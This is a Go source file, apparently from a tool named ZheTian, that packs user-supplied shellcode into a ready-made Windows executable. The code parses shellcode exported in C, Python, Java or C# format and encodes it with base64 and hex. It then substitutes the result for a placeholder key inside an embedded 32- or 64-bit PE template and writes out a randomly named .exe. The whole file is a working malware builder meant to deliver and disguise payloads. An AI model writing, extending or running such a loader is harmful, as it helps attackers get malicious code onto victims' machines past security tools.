package core

import (
	"embed"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io/fs"
	"io/ioutil"
	"os"
	"strings"
)

//go:embed temp64
var peTe64mp embed.FS

//go:embed temp32
var peTe32mp embed.FS

// Execute shellcode格式：
// java类型需去除0x
// c or python 类型需去除\x
// 示例：fc4883e4f0e8c8000000415141
func Execute() error {

	//解析flag
	outPe := flag.String("o", "", "Output executable")
	mod := flag.Int("m", 64, "Use system arch,64/32")
	flag.Parse()

	if len(os.Args) == 1 || outPe == nil {
		return errors.New("run command: ZheTian -h")
	}

	//处理shellcode
	shellCodeByte := handlePayload(*outPe)

	if shellCodeByte == "" {
		return errors.New("run command: ZheTian -h")
	}

	shellCodeByte = base64.StdEncoding.EncodeToString([]byte(shellCodeByte))
	shellCodeByte = hex.EncodeToString([]byte(shellCodeByte))
	payload, err := hex.DecodeString(shellCodeByte)
	if err != nil {
		fmt.Println(err)
		return err
	}
	key := `4d58765658544d5963656c754f73534b73686c5349704a576e4c737775766262696a64677a5641505164656a4e59624c4a50766145796379754a6b626645514a55676a7a6453474d6e42546f4c5450424553705a61754a7150435851474e4e7950476f534d77756f755a62574757627275486b7579736d614b4a4b6b48594654674c6263754676416143635a4c6e68796f795961706158565074576944555863534758614f436261697369635756734b766177717352424949495849744566446f5766466a736553715365696557617a73654b454242676c666678586f6b43656d6b4c6278646c464b566655797141534b6a4d5668696a655544795271666e5664654d6e556466456461577057657956586c6a4d624f7a4d756844764165786c57566a424542485a57784f4b46466c76704369576544436862574171544179484b45744f79744e53416b5645635471586754556b6b55427042506c677774424263687843414d566769744e697871784b4c6d624c6d44635a43596b656c756a4e5a5257665777554d4b6d4f5873464a5771694e524a784e746a455a4a416574766f544463634e63784144666d6d57566b564f6570566b557142576f4b4c685165577255416e556f71576645556a79637478706167774b754d694d7972486363654870745168725272476b4954544c69536963516a784b776471776d65436279456b4b6167556b6b424a68734267715762566a5a6143586e6a7674745a64577153466d78586a78776e7045615a7a7072556e4257466c59635052584d7168547472614d4a57567774434656475a76696d43596f7144564e72427558497841504b6e62485750517570554a4d76664156694948775657476b6d576943714f4643734559417a444244476c6c476a56465245465645495a7864436a4b4856504f4f68666a594344585062564275696c6c544642684f54444c4c414a58616d5965786f4566495954476d4243736f466472784d6b43474b4a54494663546e54714f634a71637045554e6d58426457524751455472456e6f6273556c744e4a6d456a63676768516a4668587071647574696b626c5a4d556c7a714f505675566b4e46756c52545063635a455646676d75664b7278445445484f6d6f497943517a44724d754b5643496a436d6a5263674d52777154626b736642536f494d50645866776f424b44627768475479564948575a4b65536c75416a42474f686a4b56564f726b524e786e58587562794a6f43497175565143787343467867474c4442794f42555056514e484a4873556d646b495247676d664d5a6777666872437962475650546f734e446e6678547047646a764e694a6d6756544a6b4468554256766d41666e51574a414773796f6d49634b6667594842536d627a52564572505a59626364634476666658636a71426d434346497a71786f78514751766e69586266454a564e576a4569546f6a494e51596676777564507a666f7467714a506a4a4b486c65706671446f43674e7052745950526864617a424c6a515844535051414e69595572714b46654e56657773645255567275426e485159684667466c7a58784f616a545167764555587a68537a76765a4b44505a4172505169754a4d6b756b4863656f6a4250584848706e4453425958465a574b767041495044444b536a696e6777595771654b5072585a44537074597444425978587353775150774f5a6d504253494e694a68506f4374544a4454614e697447644769694d4e7455727a684279484e6150516a4b544266436f624873426d5a436a73424c7a5579527a43635343696b4179567150536569654644464d4d427841476c704e746a4a676451765646665a6b6f467779505a42577a69517246796b4d625452654b6175754c687a43587a57635a64647152797652644965796d63744965514f44526e444d7450787a454e665a4b515962416a6844734373525961484970676f4d46787a4578597a416b70766f78446859696a4b535477637249565a614948626362786c45736577586b64496e56634c55665241684848457564637172424c446b4968625454704250686153477247437364535262674372566557794649494771644b7669696d6a644b5746454f44664a7449554f4e5869584261696e7258756478487575574251716d4a734e534d6f4d5247684c41446d6a677251687a706e7973447a557a476a4f4e7458426351554f44584d704a53787247566d45614b746e69776557746c4c47567878776b6778736a6c557a50635a4653487558547256794e517844456e487659425370524c4b6662497159614b68645a7971575a785a4565515445764c7a4c504f78455350505856666766685253426e51694a737a506e68594f424f5a62764148525a536a544e696e517a417867564f757a756c774570754a50454f574c5477516c5a4a756d7672696351476d504a555874666863645445786f71414d4646785841775577636a684d627150444c576e6d6a695776477649576a6d6d6c535a7155574d67427549626d6d4462586b6a506458794b68565a647377467359637a6c6a744f4d75504e5a667976536454437747484d4778437472616466635977486647644576414375774d54787864594f76424c68626e626656536e547969425a7a416c70706955675748527968525165656747466475564a5852665341506475447266786f734457756e446c45535a664e55744f795744636d79754f524974624a4c487972436e4a53456e73566f6a5675456158794f66777378426467485962524d4671625655674679586878446a556164494a72567a4f654b426a435741766d566c666965646957486f5951747050436f506f46435a61495256486279644c464b5457634e5a7a517a474b4347644f644f584c43794d7844476b7669726a754c72767569646b7342474447784d4a49595a555066415141616267764e4d726c4145776273767052475a4e7851587263625a6b4365597550596c644a43446157494e5153505947654e4a436e6650687041624c7850554c4c76574a736c79724b616368744b4f504b6e47596750517454527565504d74687a684a5965674967526e656b6c65435159674b766a7743694a62627a554b585a7963706164506e48715358556d6b6a464d4269704271646158484e4e7a766f69744354434d444353506254486264416248576a4150796c6c46684a4c565073467347464a4e454974505443686f444e6d657a65456f7972505345504b43654344754d6f484b714474526475684478504975456b594d7161687077506661546a43434858526d79696d776a4b4e4d595049567744574d4c7356775677787951584566664a6b484674466a587a627a696a534349634c496774516f7559554f6d6245685a48627453556b6a5572484c64626259476b4347536a4a615a7a6c4a4271526658634f417642576378646665476c6a586b736c4a4878566e6f6c4965704f536a4376697650427748414656644f48516e515863494b7542416856654f74697a6443684c61706c5879675947647a67535542496e45594c49766a72514d5261704359525979716e43676c54754c6879716652784563506354664e6671764349636769586c796b4d7172424a697851766a564648674a63506b6f51547973464a7a6d6b547141616b4f524a5665566f6c6f554342667741444d4d45544e44727874766b4d6d64674d4a526354786c42535345654a44664c457770424151664763646e477a496f46444c7844435270615976706150436268426e514a73744e4e44464c70736c75694d6f665a4b444a6f4f626f64664749534a6d694c426d6562476255697276494f477753446d6d74495a45567943524c5668557267786a446c4169584f53524965435356514a505949484153707a6a676646624b4e454868525971597a5579436f6f7957746e5355667a6e4473504452796b6b4f63487645494c51494f6b7678506c566d6874475258586179466671764c556d63696e6b4668776f776c6e6f7345627355707a6c6c4c42797557686c4171486b7a4b4868616150737a666541584f587a49537079674849534a716c75534a7a574e726f614b50417377464c7958474f426a6663756b785348594754444b4578624e706341717959614e5959477953724a75674b444d44445a6a7468577851566769525672614966506f626a5261496a63567464544e5349654e6f7a626c424d4c76637554624a794e43427a42594f674d764851774d58725265437747664c53776954697a79524d754753775273626662615878614f44565243426f676c68786f5762565346517757595453644374774f4f65415176454759696d534843424b587667444175624f4b495a64635a51506d796549676e44547a71744857714f6e4a44654a7248724368744f49454c4a6f5376694b574a75414f6f68534654424b68556449744b4e66444742636c7652736162416647666a744770424c7556786454684d784f477a65655a716e4e716d6f4d7a557a6a6f4c54646344714d644562594e587869547a4e714143674d634479425753514d467276736d565076644873504f6c6376426356625a4176796d4b57426369486c766c6d466666465047596776504b544157494c4d66766a587154646158636f78454241704c63547676736d474970784c6a7150424f6c72446d4d685151596c53714b457372664472785a6a757a47476c4b646253585855634c6c564344774147787a566f6a5879746e6c55624243464f6e6251437a42495041734244716e79425845434e776c4d6778696c585654704b44565273527a506f44715550415749426a57714a487578504d4f496e556d565870584f576b6a5662484e6575446b755858706864736e6c545a476f7075485a734f43426f5a4d5762596b667a54664856456e74787252574c51586674514358675150707070464b6e437042765853624a486a71734f424c6b5a6d537874436d6a62574952526f5a7856734561594576675245776c417465616e6e5465726a44734b674f45767a536f6f6c7647686b46487644614b624665514c6e62794b455872614f43426a574f75627a4943566e7549717564775574666762796a4342464168516d41726d575866496677704149444b516f79595a745159524b4e4b53764242654f496a71535547656545724a5970774969627343446f794e596f4442686268767855735a664a767a537a5166547a775a4a547a426157716347694b415a666a4d5150614c77734d78746376425a536d4c716d617a566276436a4c5365434b55794f524d4363476e774f6b547a725a48726579664e534a685445644b5168776163517959704c694847706766716b5563736f5561526f4e636f4c596f666a594a7a7a476775697a4658507a56744442617269664b5a5a7050656d48416b4b48484b567a694c424f685245786d414c4950754d736573566f7569635778486b626662645a48424d766f64426363487a7469424a5657504e7a684769587164444c544358795574507954767650627843567649594b5a77455744776d6c6b4761436c486a68495761505656624a6b436e66446451716741494641636c577078424b494e6b4c4c5a4c7a4a5a45536c7672756f494a475575636e6f4c7248757844744548706a526a6a55634b71736b4d4d6d494e6e55737578774156577073746c65584279776a576f57666e565a506f6b765062675776596655576c6141635979417665567874516752554c6e6c486a666d4d514e6a4454595465794b4f6b5a4c55685a466e4a61567278737945434474474a574a5859704b7a534c4a4e4174756a76436f6978715a47726564656b4871796550704377477661574b4a5375475a594968476a7a704d466a534b6f6d777a6d78434e78614c75784e4f4b694d4a77724d69415a654f74727456626257426f674c72766b46455455665263424f646954694b6e5a6f6448707455675767546f53685a4f4878646f7767467047774572784578525343534851695570784c7052666b7968524970486e69554f6a46676e6165776d754b494d72735647744a64776968674677626e5458594e6f6a55466b6979446f464d55546963495873484c5a727a5642465346764372534c7057414f7561765679417a65505355576d4b7a464a447676715a456168444c6a68624d6775575152666b425a544a664e6a664643587850796957554d6f4e70614e514d524f4e74634273766f4b557750644e5a6e45686d6a45577a50577a4d6e4b784368674956784150754a5a7a477479436d6a6b64414370764171634c5a47625864594f4f44594774784973684e4a587659456466744c55784f76705a427564654947666156514774635358614d62444f506d766a4c774849715241617950724770714e4f707643456a4b4a6b43504f596b4f7763435a617570794f4c424167514c59775a456143436d5673525361784148676d75547a6e5959487a70685579755a557042775a516b56447958664463434d50436465755044774f4f4958534f6a46446b6757766745697469566d6866486674656a75647458506b5563526b66646c6c47697558547a517a67636b565a624a664175706464416e77566f6f4264696b72636e537a534546476b4952707275764e7965434268614e4f4d70724a4b58756775724b4c736d74454a637a4f50496248666d586367416151527647744c525575575951724a41497264574f4e416f6a5a476c6170546c456371566e596552474e7976766e7654456950736c6e4a7a6e4f797a424e7a4f714378676247736e596b436a6d704b776e6f7355725050494c63494f6b724e63507a454743517a545a7a796f6d4a61564e614c56414b6958494b567a4f6c4d766977616547654864786c455155624b656e414c624f45754970636364415254444c4c7148734474766e744f5447495a6e53717745446a6a51594b63667541434873764f4362424e6f55434964505a7a6d61646263587a52566d5669754a766a534e5845796b5775575555456b7759575a7054744c4c7051446f574c714d736b75586c64505971444944496a4b4f457a6e6c4757554c73525a55544f6c62726d48784e524a785246446b4445526b546273646374566f4d4878464d73567757525450624c786961695251506671755178484b4a66646856686465474258735153546a654e73657662426c5851547a4162504f6c6a4e7341566b68507842565868484d736d456b6d5571637a4c4f6c456e75647469437855594f6e4979664c676f50784b4b5a62725871426d527a52775663704a69684d6f4942646e7562476753544876757a434d51456f43747a58786254526c574c757577696c6b426f5a6351636b4c4f6e784b5151704b496453525a6a77544e4174504d61454371565875504e72726156496958635761505a5841797743487a425074714e4151465178716c56755a6b537961687961786c736759796f636a43665247464e6a714775776c5743464e53756b77796757666c63496e4e44474c62734f5a5a6d6857506a6b4d497572616f6c4f4b6e715a7967614761636b644f4466584b4b6f6e785a5a645778714c444f5942547563636c5853647663677367437a644476564d44714c537556694d5348474561676877625753516a49774e4376475075626b5967745a56734942467a4a6b4d784d57567269586367506d5572504271746c6d78744d41415a736b4e784f4e77536461756d647869496d76596c6f5773485652705666526a75576854487a5648774466756f4647517a737362715450774a46464c454d786448784c437a684958524363596154554f654c49565255697655674e446a764e776171544d68764946596f63756a4e62504e6543455975564e6144744e70616c63536366654241724e49596a485857467a6b476661746d6c474641455153714e74506a53494a5268586149654d7574786755614a6a704a564543646e576f4e63694a794e72496e45497677676e6c535a59734f7161664e63465673434564576e48444a6d67686843504956566c5365797478636f556566714f5876644272737862716f474c6c784c4a4b4b59756966456c6f6d4a6c686166624d654464707251425543654a6f464c486957636f4b4f6e70655278534d5447715a426e66684b75584c414443775163624f78615149506c774a68505a636d514f61636172717676475a455073766a6f62754275544a616c537251644e744a53737371785356466f43514a48416d6641784b45586c6b526178657479516b44664645626f4c4c6c4c57554b547079454e58444a55596c46614267614f45745555696d6a486a6c6f7a6155594f5a4b786963647051527a616a434b4369587966784379426d50457a784e496d7969454f6e4d65776d547a544f78656a73734d5652744950695a56736969704e554e534e4b4d45537251456e655a7674466e5077626a48667642794467717557634671664f4758416b44446756656a79716a506c624d706b5845545758746842636d526874474e6d6179675675514752756d4379585577527358474f7642654d595158776b4755756c6b47497468484341536858476b7454444376544150476a53756c7953787275544b644c5655614b6c5a6a50676579526956726876525847636563756a49704f4c6c4b7956464d624769535143716b764f6d664a427a6c5668465a6b4d674251766e444f48615a637453475761427054516c48736c54506f6379596c50777a4275495245656e5661717855796e4f734a746b746342754545724a536c486d64727a6d63634e54706755424e6c58745a6f697742467054554e5470587865795652437063694e5642635a6b667850484a42637a54426f697542656b644a7075455154636d6c706e6858685a4572676152554f696d4748737a41454e6e51516665797a595a435554706f536d5356544b4d58725876706d6443767a5066456347677a53656c644e584e5362476e4c646b7a7662486c64524159574247544c707a4c52684e6567527947704763446f434f70546b5a6a65424d7a44517a4e674270634855686d66595869565a596f587446676155474173456972694e615651576a656b4e70546e6e46597a7374736c6f52594b474b4a495a4b734f6f6e6b556b694d5662726775476d5672695944494b67704e65695076434a4c46597974664671577462426e674b706a716658536b656a4543456e4359566c614450537a6b5579704b765a52476454734f4b4b7350796a4e4d427a6975456e444a7a7a56766c65684e747569484d795458714e537a6952716361444e48536c59576971776a70705a445a674a58654d7a66664c5874584d726a5658414e656e6379774f4759586a427361684549644b69764369674f745a64616a67436e4c52764d5943484f5558575644466a74726f644c4d676c6546546165616c7379466451616455674f7941466e4152616c4d656469695a6f4762535a6a526e65477a4d4e546e78464569654a43437453666b7066616b65454a46504c55584e56685a7342776a42416f5a624a444259634e5457654d5052664a416a696942684d724a4c4165686b63745074786b56544c45476d6b41696341594e666e59504b69437378666d6c4a42706e6b52574f5941754966794562736948457843414669714756426146476e6c46546e44744d4568714e5a4b7557775a6a6c46567243585079496d415146565570764558786b72664b72496e73504c474e474d5542524c555a684b76696a6d467250436e77786a4a706a465576546d74557a444e4178626e59475757504f4349645244526a484471586b787054456673416b75436d6765745a6c52517149686f6352536a636d46754f7672584b4b68756d6f784954764969424b4352724a6b735167784a626e7a5a5461664e596751534d624e50574d646873736c4e725076614b534d6d436a5262744f68456574776e596f647541624d446f534266445a6d6a425569436c7a7164514147716d494a5659724563614e47736a6f59497a5072424a49436173775978617447444e7163755752535658516169745075587767505351654746596c67437479776b736f566874565776504a75737a6747556c54437673564b616f71484e50565a6271566e535a7673546a457a794a426e4b536e4f755a494d57656c45675a4a4d6650527a73566b4e4e745670684b626c59657a66546e5544614251446f6f464a71646862677562514e7a7077664778464d41764259435357744b4b70735a64547a7164536d65445846477648427955746779444b664a5770726571757750756d47426d6a5465644d696d4f6a456f75635549444e63456b624f6f6951576b56544871434270477849466e6b626a5a6a4379634a6e6e676b4e4e77747a694d42776b485577785471444b4b61676a6b41464465666d7a556e61477265657050795a7a56446b6b476d494f5255425056504a65667474706f484b7a4f4e6c4f7454626c4e76466e4d5154577963704c4e79515a616c54464b45486f4a52615567664356596f774b4d766c54524c72454d647079786879534b73764e4f6e415779784f45566f776a547778764c4b4a6e556453567543636a6f63716a4f6148674e5a6f7557646950754e5756537854596173707841636b504546574f79726344734f41656e646d5968446f615a7042695157776f6e4779546b6865624e6e6a595a6e44494d6b46595a4c42496c4b6d687941736c65637348486f4b55734a4766424d6456557477497a4d4468735874545a7479446e5067726d68616b506a434464767a78754b68766f6743556b4f6e576c6244426349746976786a6d48696d4e564d6b4e5066446c5659715066456c5770474278534b54646753734c4d6f666b64476363726c6e71634c554a686b566850457341544f4d687a425959426d476f4e59484d69684e6e756e4464697950756a5471657376767155457246467a4a554f7744546c6d594d62487a52535144437743457172414b52525848585a56646b4f44737541774a70694269754e73744375784169796648516d4b78564a7675747372724e52646254637547794a456d764a47524b736b78687a7856554b7979755245636b7579744643644e4a625941446168756650746578516b614f514f73446c4f78744c73434b646976504a516574664d6e707a454c614a5272626b6973656973497a616d7959517578767a7a766b4754507050556249596f55674e63464369706964624c7244506f7463626a794a6e48716e57484b79645048735779625a446d655473644153655459616e64547a6e7a5869445456687a47715565695745594a5975727441686354515076794d43727062465970666b6664454f4b696364636e464f744e736769746450644a7972545150616c434e49544c486577484c4c59456a656774455a7353626579734c5a69774e5a594d654364557a6e54434465426550624a56694277644841504249795578776f6d707a457176644d4656416d4f44544f454b596a524e4267456643566d496d6775667543507753524a536456416a4d56714f7565657143484a66456e44726763495a6b5663717879756b564e4f517a4e6966494756506165726d594462736e5a585254726d494e6e43426773444d7a6e527a574950765a46525670567758684d577a544c41547973785a4357756979776d4a57545677574d524d775a4c486e6f614a7a766266635a5777465944726c6d677a64646a6867524b45466369496e68594c745268756465536755575243456f766b6e5878576f756d534562507871694d454f736d7242416e43544553724d6e7a704163506673707370734b755957794769444363667674417a43464148547347444863476472464d6d644949756572484e506a42717344737271515a424c516c61567149764875516f6c434f5877787651596d7a596673757a6a7a544c7a4b78504b6e6468527949776445724c7065434f787a627466567744426f6878437968744a6e616f477245514c4b4f53554b53425041486d527842524d624d7561584f6f4871735579767a464751466345764b6e5664796c58786f6c77724d426f7a6661434356666e6e4352686b5047784d487666496d556a6d7a414a65536a584170687a744e6b5241575649614e6a696c4c655a5467546f4959744f6378705776506544625567794944754d614a544e4864757245704465716d775a5a4a4c565355455865787765725a70796a4467644e555179786758594a6b7679537a697071434f73696562655a735472657a77744d477741534357417161424a4643715972635a4f7a456d507257776e47554c444d544355596548414a656e6158434b636b6f79645247567a477a6a4d526a6d6e79704451434e6962705a6f537577494f4d674e497379525464716471676d6d6b5062714249655953636c706d71665a50436c64685a696b6b4a47694473525972566771624f696c61446c72595a704e79574d4f6b5a77676f46564358564869536649734d5873796344564d47564366725a764a6761616847716b73654b534252764456444b50415277786a52784a794a736c7a4d514e4c744742536641437a4863764d61444b455371506a4652777579795a6a57544d6154566d534d677761497276694b4e5344465a5a55504c5075564f6879734a5854784e5765536f78566e6e737472656d7578724e48684f706c4b4e654e514966794242706956794c51685066774e594872444771504c5778674f7050416f726a4850457a4d6e6a6e437254675a6b6b50496e594551567968646356494f4e434a734d6348446774694773494d4f77445163444370484f59794c546870787272447472534346555a665a5a645376456d734f654f77716677414a666172784372686e4868664248697770504e6c7848517068547456505167725a54694e446f77556247506c4f7146754774524a5148424c4c566e6d4649534468714756576b42424a4d636c756f6a655a475668535067546b6f6d4248705a51684a46544e6b52554f51516a5752564d616e646a5a674f68767974617948524570695a515474764d564f75554143745373626773666342557958455755716c494352734a4b4e446b6f516e5a725153434c684e71555a686d474a49624b5554677a6742656b6e7172616970776f6a4c5a6d445a744862786e494e6561547942786d66714b766d5158766770487564766e514364717552784c5076674552506e4755764753424b4c767957636b577a706f586c43564d5754655448624253436c4b6e4d716c47664c5945474c657a41707053514c426b63664f706a745953414f65417679654e53706178567a74526f6f4464477a6b5956766e4b5771505a52565942694e4761487a514d48764359634b556747514f584b4441764e624e716968566d6159494478434656524a6d5364694d41736b446f426b71705742714f6c62425844435956674b6f4f68514378636d5346626c4364516e55516849456d4c53474a49656377695267774c4155514d677541466879587463546671467552424e71427446524b61754e6d7a625551504a4c69724862554e654d7a77636969654746537258494f7343624570446d6d78766d6a43516c5243536a45477745675a7448426e765a75676e4d6c5a444d485045445147595850684a58657755745264544d6c4650417743687756796a79656570726a5354745743676f415561776a784f73574847527a494e716373557a455743654c68534352474d526474576d6b6a6b5269795a744e5341456142504a6b5772664266486456724e5563485a724445794a6173554677716962594264516a7676767a6d785948445657746a7977557053514b6364`

	var file []byte

	if *mod == 64 {
		file, _ = peTe64mp.ReadFile("temp64")
		file, _ = base64.StdEncoding.DecodeString(string(file))
	} else {
		file, _ = peTe32mp.ReadFile("temp32")
		file, _ = base64.StdEncoding.DecodeString(string(file))
	}

	//拼接占位符：{-$-}
	//7b2d242d7d
	if ((len(key) / 2) - 5) > len(payload) {
		count := ((len(key) / 2) - 5) - len(payload)
		shellCodeByte += "7b2d242d7d"
		for i := 0; i < (count); i++ {
			shellCodeByte += "00"
		}
	}

	hexStr := hex.EncodeToString(file)

	if strings.Contains(hexStr, key) {
		hexStr = strings.ReplaceAll(hexStr, key, shellCodeByte)
	}

	decodeString, err := hex.DecodeString(hexStr)
	if err != nil {
		return err
	}

	return ioutil.WriteFile(GetRand()+".exe", decodeString, fs.ModeExclusive)
}

// handlePayload shellcode处理
func handlePayload(s string) string {
	//读取文件
	fileByte, err := ioutil.ReadFile(s)
	if err != nil {
		fmt.Println("The system cannot find the file specified")
		os.Exit(1)
	}
	str := string(fileByte)
	if strings.Contains(str, "{") {
		//这是Java和C#之流，截取{}内的hex
		str = str[strings.LastIndex(str, "{")+1 : strings.LastIndex(str, "}")]
	} else if strings.Contains(str, "\\x") {
		//这是c、python之流，提取""内的hex
		str = str[strings.Index(str, "\"")+1 : strings.LastIndex(str, "\"")]
	}

	//过滤杂项
	str = strings.ReplaceAll(str, "buf += b", "")
	str = strings.ReplaceAll(str, "buf +=", "")
	str = strings.ReplaceAll(str, "\"", "")
	str = strings.ReplaceAll(str, "\\x", "")
	str = strings.ReplaceAll(str, "0x", "")
	str = strings.ReplaceAll(str, " ", "")
	str = strings.ReplaceAll(str, "+", "")
	str = strings.ReplaceAll(str, ";", "")
	str = strings.ReplaceAll(str, ",", "")
	str = strings.ReplaceAll(str, "\n", "")
	str = strings.ReplaceAll(str, "\t", "")
	str = strings.ReplaceAll(str, "\r", "")
	str = strings.ReplaceAll(str, "(byte)", "")
	return str
}
